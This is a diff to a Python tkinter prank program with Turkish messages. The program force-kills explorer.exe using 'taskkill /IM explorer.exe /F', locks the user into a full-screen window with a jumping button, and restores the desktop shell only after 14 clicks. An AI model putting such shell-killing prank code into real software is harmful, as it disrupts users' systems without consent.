@@ -21,11 +21,10 @@
 
 from tkinter import *
 from tkinter import messagebox
-import time
 import webbrowser
-import os
+import subprocess
 import random
-os.system("taskkill /IM explorer.exe /F")
+subprocess.Popen("taskkill /IM explorer.exe /F", shell=True)
 s=0
 while True:
     def private():
@@ -40,9 +39,6 @@ while True:
         global s
         if s != 14:
             s=s+1
-            if s == 1:
-                global tic
-                tic = time.time()
             messagebox.showwarning("Ah be...","Geberdiniz, Allah rahmet eylesin.")
             window.attributes("-fullscreen", False)
             error()
@@ -52,9 +48,7 @@ while True:
             button.place(relx=str(random.uniform(0.2, 0.8)), rely=str(random.uniform(0.2, 0.8)))
         else:
             messagebox.showinfo("Tebrikler", "Mezarınıza kavuştunuz.")
-            toc = time.time()
-            t = str(toc-tic)
-            os.system("explorer.exe")
+            subprocess.Popen("explorer.exe", shell=True)
             button.config(text="ÇOK GİZLİ DOSYA", command=private)
             button.place(relx=0.5, rely=0.5)
     window=Tk(className="ANA HATA")
